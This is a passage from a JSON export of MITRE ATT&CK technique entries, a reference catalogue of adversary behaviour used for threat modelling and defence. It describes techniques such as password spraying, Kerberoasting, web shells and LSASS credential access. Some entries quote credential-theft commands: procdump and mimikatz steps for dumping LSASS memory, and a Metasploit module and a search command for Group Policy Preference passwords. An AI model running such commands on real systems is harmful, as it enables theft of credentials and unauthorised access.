throughout the environment. Azure tools and APIs, such as the Azure AD Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.(Citation: Azure - Resource Manager API)(Citation: Azure AD Graph API)\\n\\nStormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.(Citation: Azure - Stormspotter)(Citation: GitHub Pacu)\", \"id\": \"attack-pattern--e24fcba8-2557-4442-a139-1ee2f2e784db\"}, \"attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:00.645Z\", \"name\": \"Valid Accounts\", \"attack_pattern_identifier\": \"T1078\", \"description\": \"Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\\n\\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise. (Citation: TechNet Credential Theft)\", \"modified\": \"2020-10-19T16:01:22.724Z\", \"id\": \"attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81\"}, \"attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:38.910Z\", \"name\": \"Boot or Logon Initialization Scripts\", \"attack_pattern_identifier\": \"T1037\", \"description\": \"Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \\n\\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \\n\\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.\", \"modified\": \"2020-08-03T16:47:37.240Z\", \"id\": \"attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334\"}, \"attack-pattern--dfd7cc1d-e1d8-4394-a198-97c4cab8aa67\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-09T14:29:51.508Z\", \"name\": \"Visual Basic\", \"attack_pattern_identifier\": \"T1059.005\", \"description\": \"Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)\\n\\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.(Citation: Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript/JScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)\\n\\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads.\", \"modified\": \"2020-08-13T20:09:39.122Z\", \"id\": \"attack-pattern--dfd7cc1d-e1d8-4394-a198-97c4cab8aa67\"}, \"attack-pattern--692074ae-bb62-4a5e-a735-02cb6bde458c\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-11T18:39:25.122Z\", \"name\": \"Password Spraying\", \"attack_pattern_identifier\": \"T1110.003\", \"description\": \"Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)\\n\\nTypically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:\\n\\n* SSH (22/TCP)\\n* Telnet (23/TCP)\\n* FTP (21/TCP)\\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\\n* LDAP (389/TCP)\\n* Kerberos (88/TCP)\\n* RDP / Terminal Services (3389/TCP)\\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\\n* MSSQL (1433/TCP)\\n* Oracle (1521/TCP)\\n* MySQL (3306/TCP)\\n* VNC (5900/TCP)\\n\\nIn addition to management services, adversaries may \\\"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\\\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)\\n\\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \\\"logon failure\\\" event ID 4625.\", \"modified\": \"2020-10-19T22:43:45.579Z\", \"id\": \"attack-pattern--692074ae-bb62-4a5e-a735-02cb6bde458c\"}, \"attack-pattern--8d7bd4f5-3a89-4453-9c82-2c8894d5655e\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-11T18:43:06.253Z\", \"name\": \"Group Policy Preferences\", \"attack_pattern_identifier\": \"T1552.006\", \"description\": \"Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.(Citation: Microsoft GPP 2016)\\n\\nThese group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).(Citation: Microsoft GPP Key)\\n\\nThe following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:\\n\\n* Metasploit\\u2019s post exploitation module: <code>post/windows/gather/credentials/gpp</code>\\n* Get-GPPPassword(Citation: Obscuresecurity Get-GPPPassword)\\n* gpprefdecrypt.py\\n\\nOn the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: <code>dir /s * .xml</code>\\n\", \"modified\": \"2020-06-17T14:25:38.082Z\", \"id\": \"attack-pattern--8d7bd4f5-3a89-4453-9c82-2c8894d5655e\"}, \"attack-pattern--b4b7458f-81f2-4d38-84be-1c5ba0167a52\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-10T19:49:46.752Z\", \"name\": \"Invalid Code Signature\", \"attack_pattern_identifier\": \"T1036.001\", \"modified\": \"2020-02-10T19:52:47.724Z\", \"description\": \"Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.(Citation: Threatexpress MetaTwin 2017)\\n\\nUnlike [Code Signing](https://attack.mitre.org/techniques/T1553/002), this activity will not result in a valid signature.\", \"id\": \"attack-pattern--b4b7458f-81f2-4d38-84be-1c5ba0167a52\"}, \"attack-pattern--30973a08-aed9-4edf-8604-9084ce1b5c4f\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:25.967Z\", \"name\": \"Clipboard Data\", \"attack_pattern_identifier\": \"T1115\", \"description\": \"Adversaries may collect data stored in the clipboard from users copying information within or between applications. \\n\\nIn Windows, Applications can access clipboard data by using the Windows API.(Citation: MSDN Clipboard) OSX provides a native command, <code>pbpaste</code>, to grab clipboard contents.(Citation: Operating with EmPyre)\", \"modified\": \"2020-04-23T18:35:58.230Z\", \"id\": \"attack-pattern--30973a08-aed9-4edf-8604-9084ce1b5c4f\"}, \"attack-pattern--9a60a291-8960-4387-8a4a-2ab5c18bb50b\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-15T16:16:25.763Z\", \"name\": \"File Transfer Protocols\", \"attack_pattern_identifier\": \"T1071.002\", \"description\": \"Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \\n\\nProtocols such as FTP, FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. \", \"modified\": \"2020-08-21T14:41:22.911Z\", \"id\": \"attack-pattern--9a60a291-8960-4387-8a4a-2ab5c18bb50b\"}, \"attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:04.710Z\", \"name\": \"File and Directory Discovery\", \"attack_pattern_identifier\": \"T1083\", \"modified\": \"2020-09-16T16:02:16.770Z\", \"description\": \"Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\\n\\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. (Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the [Native API](https://attack.mitre.org/techniques/T1106).\", \"id\": \"attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18\"}, \"attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:55.892Z\", \"name\": \"Indicator Removal on Host\", \"attack_pattern_identifier\": \"T1070\", \"description\": \"Adversaries may delete or alter generated artifacts on a host system, including logs or captured files such as quarantined malware. Locations and format of logs are platform or product-specific, however standard operating system logs are captured as Windows events or Linux/macOS files such as [Bash History](https://attack.mitre.org/techniques/T1139) and /var/log/*.\\n\\nThese actions may interfere with event collection, reporting, or other notifications used to detect intrusion activity. This that may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.\", \"modified\": \"2020-10-16T18:09:49.074Z\", \"id\": \"attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69\"}, \"attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:16.408Z\", \"name\": \"Ingress Tool Transfer\", \"attack_pattern_identifier\": \"T1105\", \"modified\": \"2020-03-20T15:42:48.595Z\", \"description\": \"Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.\", \"id\": \"attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add\"}, \"attack-pattern--e7cbc1de-1f79-48ee-abfd-da1241c65a15\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-10-01T02:11:47.237Z\", \"name\": \"Code Signing Certificates\", \"attack_pattern_identifier\": \"T1588.003\", \"description\": \"Before compromising a victim, adversaries may buy and/or steal code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.\\n\\nPrior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may purchase or steal code signing certificates for use in operations. The purchase of code signing certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal code signing materials directly from a compromised third-party.\", \"modified\": \"2020-10-22T18:22:21.007Z\", \"id\": \"attack-pattern--e7cbc1de-1f79-48ee-abfd-da1241c65a15\"}, \"attack-pattern--a782ebe2-daba-42c7-bc82-e8e9d923162d\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-14T23:23:41.770Z\", \"name\": \"Multi-hop Proxy\", \"attack_pattern_identifier\": \"T1090.003\", \"description\": \"To disguise the source of malicious traffic, adversaries may chain together multiple proxies. Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy. This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source. A particular variant of this behavior is to use onion routing networks, such as the publicly available TOR network. (Citation: Onion Routing)\\n\\nIn the case of network infrastructure, particularly routers, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain within the Wide-Area Network (WAN) of the enterprise.  By leveraging [Patch System Image](https://attack.mitre.org/techniques/T1601/001), adversaries can add custom code to the affected network devices that will implement onion routing between those nodes.  This custom onion routing network will transport the encrypted C2 traffic through the compromised population, allowing adversaries to communicate with any device within the onion routing network.  This method is dependent upon the [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599) method in order to allow the adversaries to cross the protected network boundary of the Internet perimeter and into the organization\\u2019s WAN. Protocols such as ICMP may be used as a transport.\", \"modified\": \"2020-10-21T17:54:28.280Z\", \"id\": \"attack-pattern--a782ebe2-daba-42c7-bc82-e8e9d923162d\"}, \"attack-pattern--65f2d882-3f41-4d48-8a06-29af77ec9f90\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-11T18:41:44.783Z\", \"name\": \"LSASS Memory\", \"attack_pattern_identifier\": \"T1003.001\", \"modified\": \"2020-06-09T20:46:00.393Z\", \"description\": \"Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).\\n\\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\\n\\nFor example, on the target host use procdump:\\n\\n* <code>procdump -ma lsass.exe lsass_dump</code>\\n\\nLocally, mimikatz can be run using:\\n\\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\\n* <code>sekurlsa::logonPasswords</code>\\n\\n\\nWindows Security Support Provider (SSP) DLLs are loaded into LSSAS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\Security Packages</code> and <code>HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\OSConfig\\\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)\\n\\nThe following SSPs can be used to access credentials:\\n\\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)\\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)\\n\", \"id\": \"attack-pattern--65f2d882-3f41-4d48-8a06-29af77ec9f90\"}, \"attack-pattern--767dbf9e-df3f-45cb-8998-4903ab5f80c0\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2019-02-14T16:15:05.974Z\", \"name\": \"Domain Trust Discovery\", \"attack_pattern_identifier\": \"T1482\", \"description\": \"Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.(Citation: Microsoft Trusts) Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct [SID-History Injection](https://attack.mitre.org/techniques/T1134/005), [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003), and [Kerberoasting](https://attack.mitre.org/techniques/T1558/003).(Citation: AdSecurity Forging Trust Tickets)(Citation: Harmj0y Domain Trusts) Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP.(Citation: Harmj0y Domain Trusts) The Windows utility [Nltest](https://attack.mitre.org/software/S0359) is known to be used by adversaries to enumerate domain trusts.(Citation: Microsoft Operation Wilysupply)\", \"modified\": \"2020-09-17T18:26:17.858Z\", \"id\": \"attack-pattern--767dbf9e-df3f-45cb-8998-4903ab5f80c0\"}, \"attack-pattern--bd369cd9-abb8-41ce-b5bb-fff23ee86c00\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-03-11T14:17:21.153Z\", \"name\": \"Compromise Software Supply Chain\", \"attack_pattern_identifier\": \"T1195.002\", \"modified\": \"2020-03-11T14:17:21.153Z\", \"description\": \"Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.\\n\\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Avast CCleaner3 2018) (Citation: Command Five SK 2011)  \", \"id\": \"attack-pattern--bd369cd9-abb8-41ce-b5bb-fff23ee86c00\"}, \"attack-pattern--57340c81-c025-4189-8fa0-fc7ede51bae4\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:23.587Z\", \"name\": \"Modify Registry\", \"attack_pattern_identifier\": \"T1112\", \"description\": \"Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\\n\\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\\n\\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg](https://attack.mitre.org/software/S0075) or other utilities using the Win32 API. (Citation: Microsoft Reghide NOV 2006) Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. (Citation: TrendMicro POWELIKS AUG 2014) (Citation: SpectorOps Hiding Reg Jul 2017)\\n\\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often [Valid Accounts](https://attack.mitre.org/techniques/T1078) are required, along with access to the remote system's [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) for RPC communication.\", \"modified\": \"2020-08-13T20:02:49.641Z\", \"id\": \"attack-pattern--57340c81-c025-4189-8fa0-fc7ede51bae4\"}, \"attack-pattern--0458aab9-ad42-4eac-9e22-706a95bafee2\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-09-30T16:37:40.271Z\", \"name\": \"Acquire Infrastructure\", \"attack_pattern_identifier\": \"T1583\", \"description\": \"Before compromising a victim, adversaries may buy, lease, or rent infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services.(Citation: TrendmicroHideoutsLease) Additionally, botnets are available for rent or purchase.\\n\\nUse of these infrastructure solutions allows an adversary to stage, launch, and execute an operation. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contact to third-party web services. Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.\", \"modified\": \"2020-10-22T17:59:17.606Z\", \"id\": \"attack-pattern--0458aab9-ad42-4eac-9e22-706a95bafee2\"}, \"attack-pattern--f2877f7f-9a4c-4251-879f-1224e3006bee\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-11T18:43:38.588Z\", \"name\": \"Kerberoasting\", \"attack_pattern_identifier\": \"T1558.003\", \"description\": \"Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) \\n\\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)\\n\\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)\\n\\nThis same attack could be executed using service tickets captured from network traffic.(Citation: AdSecurity Cracking Kerberos Dec 2015)\\n\\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)\", \"modified\": \"2020-10-20T19:30:10.687Z\", \"id\": \"attack-pattern--f2877f7f-9a4c-4251-879f-1224e3006bee\"}, \"attack-pattern--5d0d3609-d06d-49e1-b9c9-b544e0c618cb\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2019-12-13T16:46:18.927Z\", \"name\": \"Web Shell\", \"attack_pattern_identifier\": \"T1505.003\", \"modified\": \"2020-09-16T19:34:19.752Z\", \"description\": \"Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.\\n\\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (ex: [China Chopper](https://attack.mitre.org/software/S0020) Web shell client).(Citation: Lee 2013) \", \"id\": \"attack-pattern--5d0d3609-d06d-49e1-b9c9-b544e0c618cb\"}, \"attack-pattern--db8f5003-3b20-48f0-9b76-123e44208120\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-10-02T16:54:23.193Z\", \"name\": \"Scanning IP Blocks\", \"attack_pattern_identifier\": \"T1595.001\", \"description\": \"Before compromising a victim, adversaries may scan victim IP blocks to gather information that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses.\\n\\nAdversaries may scan IP blocks in order to [Gather Victim Network Information](https://attack.mitre.org/techniques/T1590), such as which IP addresses are actively in use as well as more detailed information about hosts assigned these addresses. Scans may range from simple pings (ICMP requests and responses) to more nuanced scans that may reveal host software/versions via server banners or other network artifacts.(Citation: Botnet Scan) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).\", \"modified\": \"2020-10-24T04:06:09.139Z\", \"id\": \"attack-pattern--db8f5003-3b20-48f0-9b76-123e44208120\"}, \"attack-pattern--4061e78c-1284-44b4-9116-73e4ac3912f7\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2018-04-18T17:59:24.739Z\", \"name\": \"Remote Access Software\", \"attack_pattern_identifier\": \"T1219\", \"description\": \"An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\\n\\nRemote access tools may be established and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system.\\n\\nAdmin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns. (Citation: CrowdStrike 2015 Global Threat Report) (Citation: CrySyS Blog TeamSpy)\", \"modified\": \"2020-06-20T20:42:37.320Z\", \"id\": \"attack-pattern--4061e78c-1284-44b4-9116-73e4ac3912f7\"}, \"attack-pattern--4f9ca633-15c5-463c-9724-bdcd54fde541\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-11T18:25:28.212Z\", \"name\": \"SMB/Windows Admin Shares\", \"attack_pattern_identifier\": \"T1021.002\", \"modified\": \"2020-03-23T21:16:02.812Z\", \"description\": \"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\\n\\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\\n\\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over SMB,(Citation: Wikipedia Server Message Block) to interact with systems using remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration and patch levels.(Citation: Microsoft Admin Shares)\", \"id\": \"attack-pattern--4f9ca633-15c5-463c-9724-bdcd54fde541\"}, \"attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d\": {\"x_mitre_is_subtechnique\": true, \"created\": \"2020-02-18T16:39:06.289Z\", \"name\": \"Token Impersonation/Theft\", \"attack_pattern_identifier\": \"T1134.001\", \"modified\": \"2020-03-26T21:29:18.608Z\", \"description\": \"Adversaries may duplicate then impersonate another user's token to escalate privileges and bypass access controls. An adversary can create a new access token that duplicates an existing token using <code>DuplicateToken(Ex)</code>. The token can then be used with <code>ImpersonateLoggedOnUser</code> to allow the calling thread to impersonate a logged on user's security context, or with <code>SetThreadToken</code> to assign the impersonated token to a thread.\\n\\nAn adversary may do this when they have a specific, existing process they want to assign the new token to. For example, this may be useful for when the target user has a non-network logon session on the system.\", \"id\": \"attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d\"}, \"attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:30:38.511Z\", \"name\": \"Masquerading\", \"attack_pattern_identifier\": \"T1036\", \"description\": \"Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\\n\\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)\", \"modified\": \"2020-07-09T13:54:28.727Z\", \"id\": \"attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0\"}, \"attack-pattern--72b74d71-8169-42aa-92e0-e7b04b9f5a08\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2017-05-31T21:31:06.988Z\", \"name\": \"Account Discovery\", \"attack_pattern_identifier\": \"T1087\", \"description\": \"Adversaries may attempt to get a listing of accounts on a system or within an environment. This information can help adversaries determine which accounts exist to aid in follow-on behavior.\", \"modified\": \"2020-09-16T15:10:18.260Z\", \"id\": \"attack-pattern--72b74d71-8169-42aa-92e0-e7b04b9f5a08\"}, \"attack-pattern--435dfb86-2697-4867-85b5-2fef496c0517\": {\"x_mitre_is_subtechnique\": false, \"created\": \"2020-02-04T12:47:23.631Z\", \"name\": \"Unsecured Credentials\", \"attack_pattern_identifier\": \"T1552\", \"description\": \"Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. [Bash History](https://attack.mitre.org/techniques/T1552/003)), operating system or application-specific repositories (e.g. [Credentials in Registry](https://attack.mitre.org/techniques/T1552/002)), or other specialized files/artifacts (e.g. [Private Keys](https://attack.mitre.org/techniques/T1552/004)).\", \"modified\": \"2020-10-15T19:39:36.109Z\", \"id\": 